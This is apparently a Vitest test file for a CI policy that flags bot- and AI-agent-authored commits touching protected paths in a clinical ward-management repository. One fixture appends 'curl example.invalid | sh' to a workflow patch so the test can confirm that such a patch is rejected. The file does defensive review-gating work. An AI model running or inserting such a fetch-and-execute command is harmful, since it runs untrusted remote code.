import { describe, expect, it } from "vitest";
import {
  agentSensitiveCommitWarnings,
  botSensitiveCommitViolations,
  isAgentAuthor,
  isBotAuthor,
  isSensitivePath,
} from "../scripts/ward-ci-public/bot-author-policy.mjs";

const bot = { login: "qodo-merge-pro[bot]", email: "" };
const human = { login: "BigSimmo", email: "87357024+BigSimmo@users.noreply.github.com" };

describe("bot-author PR policy", () => {
  it("recognises bot authors by login suffix, known login and noreply email", () => {
    expect(isBotAuthor(bot)).toBe(true);
    expect(isBotAuthor({ login: "dependabot[bot]" })).toBe(true);
    expect(isBotAuthor({ login: "Qodo-Merge-Pro" })).toBe(true);
    expect(isBotAuthor({ email: "49699333+dependabot[bot]@users.noreply.github.com" })).toBe(true);
    expect(isBotAuthor({ email: "1+coderabbitai@users.noreply.github.com" })).toBe(true);
    expect(isBotAuthor(human)).toBe(false);
    expect(isBotAuthor(undefined)).toBe(false);
  });

  it("protects supabase, backend infra SQL and clinical paths", () => {
    expect(isSensitivePath("supabase/migrations/1_x.sql")).toBe(true);
    expect(isSensitivePath("backend/ward-flow/infra/supabase-runtime-role.sql")).toBe(true);
    expect(isSensitivePath("data/mha-2014-sections.json")).toBe(true);
    expect(isSensitivePath("docs/ward-flow/governance/CLINICAL-SAFETY-CASE.md")).toBe(true);
    expect(isSensitivePath("docs/ward-flow/clinical-values.md")).toBe(true);
    expect(isSensitivePath("src/components/ward-management/ward-clinical-values.ts")).toBe(true);
    expect(isSensitivePath("package.json")).toBe(false);
    expect(isSensitivePath("backend/ward-flow/infra/README.md")).toBe(false);
    expect(isSensitivePath("src/components/ward-management/shell/ward-prototype-footer.tsx")).toBe(false);
  });

  it("protects Ward Flow's real migrations, sign-in, engine and legal logic", () => {
    for (const file of [
      "backend/ward-flow/migrations/013-referral-record-views.sql",
      "backend/ward-flow/migrations.mjs",
      "backend/ward-flow/engine.ts",
      "backend/ward-flow/command-schemas.ts",
      "backend/ward-flow/auth.mjs",
      "backend/ward-flow/supabase-auth.mjs",
      "src/components/ward-management/ward-eligibility.ts",
      "src/components/ward-management/legal-forms/legal-form-progression.ts",
      "src/components/ward-management/legal-forms/legal-forms-derivations.ts",
      "src/components/ward-management/ward-legal-clock.ts",
      "src/components/ward-management/ward-legal-forms.ts",
      "src/components/ward-management/ward-stay-legal.ts",
      "src/components/ward-management/ward-held-legal-check.ts",
      "src/components/ward-management/ward-flow-record-legal-events.ts",
    ]) {
      expect(isSensitivePath(file), file).toBe(true);
    }
    for (const file of [
      "backend/ward-flow/README.md",
      "backend/ward-flow/server.mjs",
      "backend/ward-flow/supabase-auth.test.mjs",
      "src/components/ward-management/legal-forms/legal-forms.module.css",
      "src/components/ward-management/legal-forms/legal-forms-panel.tsx",
      "tests/ward-legal-clock.test.ts",
    ]) {
      expect(isSensitivePath(file), file).toBe(false);
    }
  });

  it("flags only bot commits whose own files are protected", () => {
    expect(
      botSensitiveCommitViolations([{ sha: "a".repeat(40), author: bot, files: ["data/mha-2014-sections.json"] }]),
    ).toHaveLength(1);
    expect(
      botSensitiveCommitViolations([
        { sha: "b".repeat(40), author: human, files: ["supabase/config.toml"] },
        { sha: "c".repeat(40), author: bot, files: ["README.md"] },
        { sha: "d".repeat(40), author: { login: "dependabot[bot]" }, files: ["package.json", "package-lock.json"] },
      ]),
    ).toEqual([]);
  });

  it("lets Dependabot change workflow action pins only", async () => {
    const { isActionPinOnlyPatch } = await import("../scripts/ward-ci-public/bot-author-policy.mjs");
    const pin = [
      "@@ -10,7 +10,7 @@ jobs:",
      "     steps:",
      "-      - uses: actions/checkout@" + "a".repeat(40) + " # v4.1.0",
      "+      - uses: actions/checkout@" + "b".repeat(40) + " # v4.2.0",
    ].join("\n");
    const edit = pin + "\n+        run: curl example.invalid | sh";
    expect(isActionPinOnlyPatch(pin)).toBe(true);
    expect(isActionPinOnlyPatch(edit)).toBe(false);
    expect(isActionPinOnlyPatch(undefined)).toBe(false);
    const workflow = ".github/workflows/ward-flow.yml";
    const dependabot = { login: "dependabot[bot]" };
    expect(
      botSensitiveCommitViolations([
        { sha: "f".repeat(40), author: dependabot, files: [workflow], actionPinOnlyFiles: [workflow] },
      ]),
    ).toEqual([]);
    expect(botSensitiveCommitViolations([{ sha: "f".repeat(40), author: dependabot, files: [workflow] }])).toHaveLength(
      1,
    );
    // Only Dependabot gets the exemption, and only for workflow files.
    expect(
      botSensitiveCommitViolations([
        { sha: "f".repeat(40), author: bot, files: [workflow], actionPinOnlyFiles: [workflow] },
        {
          sha: "0".repeat(40),
          author: dependabot,
          files: ["scripts/ward-ci-public/plan.mjs"],
          actionPinOnlyFiles: ["scripts/ward-ci-public/plan.mjs"],
        },
      ]),
    ).toHaveLength(2);
  });

  it("fails closed when a bot commit's files are unknown", () => {
    expect(botSensitiveCommitViolations([{ sha: "e".repeat(40), author: bot }])[0]).toMatch(/failing closed/);
  });
});

describe("bot-author PR policy: coding-agent warn tier (A6-F02)", () => {
  const claude = { login: "claude", email: "noreply@anthropic.com" };

  it("recognises coding agents without moving bots out of the failing tier", () => {
    expect(isAgentAuthor(claude)).toBe(true);
    expect(isAgentAuthor({ login: "", email: "noreply@anthropic.com" })).toBe(true);
    expect(isAgentAuthor({ login: "CursorAgent" })).toBe(true);
    expect(isAgentAuthor({ email: "cursoragent@cursor.com" })).toBe(true);
    expect(isAgentAuthor({ login: "codex" })).toBe(true);
    expect(isAgentAuthor({ login: "chatgpt-codex-connector" })).toBe(true);
    expect(isBotAuthor(claude)).toBe(false);
    for (const login of ["cursor[bot]", "chatgpt-codex-connector[bot]", "copilot-swe-agent"]) {
      expect(isBotAuthor({ login }), login).toBe(true);
      expect(isAgentAuthor({ login }), login).toBe(false);
    }
    expect(isAgentAuthor(human)).toBe(false);
    expect(isAgentAuthor(undefined)).toBe(false);
  });

  it("protects workflows, public CI scripts and the protected safety tests", () => {
    for (const file of [
      ".github/workflows/ward-flow.yml",
      "scripts/ward-ci-public/plan.mjs",
      "scripts/ward-ci-public/bot-author-policy.mjs",
      "scripts/ward-flow/protected-safety-tests.json",
      "tests/ward-engine-safety.test.ts",
      "tests/ward-permission-matrix.test.ts",
    ]) {
      expect(isSensitivePath(file), file).toBe(true);
    }
    for (const file of [".github/dependabot.yml", "scripts/ward-flow/other.json", "tests/ward-engine.test.ts"]) {
      expect(isSensitivePath(file), file).toBe(false);
    }
  });

  it("warns, but does not fail, on an agent commit touching the engine", () => {
    const commits = [{ sha: "f".repeat(40), author: claude, files: ["backend/ward-flow/engine.ts"] }];
    expect(botSensitiveCommitViolations(commits)).toEqual([]);
    const warnings = agentSensitiveCommitWarnings(commits);
    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toMatch(/Agent-authored commit f{12} \(claude\).*engine\.ts.*Warning only/);
  });

  it("fails a bot commit touching a workflow", () => {
    const commits = [{ sha: "1".repeat(40), author: bot, files: [".github/workflows/ward-flow.yml"] }];
    expect(botSensitiveCommitViolations(commits)).toHaveLength(1);
    expect(agentSensitiveCommitWarnings(commits)).toEqual([]);
  });

  it("says nothing about a human commit on the same paths", () => {
    const commits = [
      { sha: "2".repeat(40), author: human, files: ["backend/ward-flow/engine.ts", ".github/workflows/ward-flow.yml"] },
    ];
    expect(botSensitiveCommitViolations(commits)).toEqual([]);
    expect(agentSensitiveCommitWarnings(commits)).toEqual([]);
  });

  it("warns (not fails) when an agent commit's files are unknown, and ignores unprotected agent work", () => {
    expect(agentSensitiveCommitWarnings([{ sha: "3".repeat(40), author: claude }])[0]).toMatch(/review it by hand/);
    expect(agentSensitiveCommitWarnings([{ sha: "4".repeat(40), author: claude, files: ["README.md"] }])).toEqual([]);
  });
});

describe("bot-author PR policy: truncated listings", () => {
  const json = (body: unknown) => ({ ok: true, status: 200, statusText: "OK", json: async () => body });

  it("fails closed when the PR commit list is shorter than the PR's commit count", async () => {
    const { collectPullRequestCommits } = await import("../scripts/ward-ci-public/bot-author-policy.mjs");
    const original = globalThis.fetch;
    globalThis.fetch = (async (url: string) =>
      json(url.includes("/commits?") ? [{ sha: "a", author: { login: "x" }, commit: {} }] : { commits: 2 })) as never;
    try {
      await expect(collectPullRequestCommits({ repository: "o/r", prNumber: "1", token: "t" })).rejects.toThrow(
        /incomplete/,
      );
    } finally {
      globalThis.fetch = original;
    }
  });

  it("reads a PR of 250 or more commits from the paged compare listing", async () => {
    const { collectPullRequestCommits } = await import("../scripts/ward-ci-public/bot-author-policy.mjs");
    const original = globalThis.fetch;
    const urls: string[] = [];
    const commit = (n: number, login: string) => ({ sha: `c${n}`, author: { login }, commit: { author: {} } });
    globalThis.fetch = (async (url: string) => {
      urls.push(url);
      if (url.includes("/compare/b...h?")) {
        const page = Number(url.match(/page=(\d+)$/u)?.[1]);
        const count = page <= 3 ? 100 : page === 4 ? 12 : 0;
        const commits = Array.from({ length: count }, (_, i) => {
          const n = (page - 1) * 100 + i;
          return commit(n, n === 311 ? "coderabbitai" : "human");
        });
        return json({ total_commits: 312, commits });
      }
      if (url.includes("/commits/c311")) return json({ files: [{ filename: "supabase/x.sql" }] });
      return json({ commits: 312, base: { sha: "b" }, head: { sha: "h" } });
    }) as never;
    try {
      const commits = await collectPullRequestCommits({ repository: "o/r", prNumber: "1", token: "t" });
      expect(urls.some((url) => url.includes("/pulls/1/commits"))).toBe(false);
      expect(commits).toEqual([
        { sha: "c311", author: { login: "coderabbitai", email: "" }, files: ["supabase/x.sql"] },
      ]);
    } finally {
      globalThis.fetch = original;
    }
  });

  it("fails closed when the compare listing is shorter than the PR's commit count", async () => {
    const { collectPullRequestCommits } = await import("../scripts/ward-ci-public/bot-author-policy.mjs");
    const original = globalThis.fetch;
    globalThis.fetch = (async (url: string) =>
      json(
        url.includes("/compare/")
          ? { total_commits: 300, commits: [{ sha: "a", author: { login: "x" }, commit: {} }] }
          : { commits: 300, base: { sha: "b" }, head: { sha: "h" } },
      )) as never;
    try {
      await expect(collectPullRequestCommits({ repository: "o/r", prNumber: "1", token: "t" })).rejects.toThrow(
        /incomplete/,
      );
    } finally {
      globalThis.fetch = original;
    }
  });

  it("reads every page of a bot commit's files", async () => {
    const { collectCommitFiles } = await import("../scripts/ward-ci-public/bot-author-policy.mjs");
    const original = globalThis.fetch;
    const page = (n: number, count: number) => Array.from({ length: count }, (_, i) => ({ filename: `f${n}-${i}` }));
    globalThis.fetch = (async (url: string) =>
      json({ files: url.endsWith("&page=1") ? page(1, 100) : [{ filename: "supabase/x.sql" }] })) as never;
    try {
      const files = await collectCommitFiles({ repository: "o/r", sha: "a", token: "t" });
      expect(files).toHaveLength(101);
      expect(files).toContain("supabase/x.sql");
    } finally {
      globalThis.fetch = original;
    }
  });
});
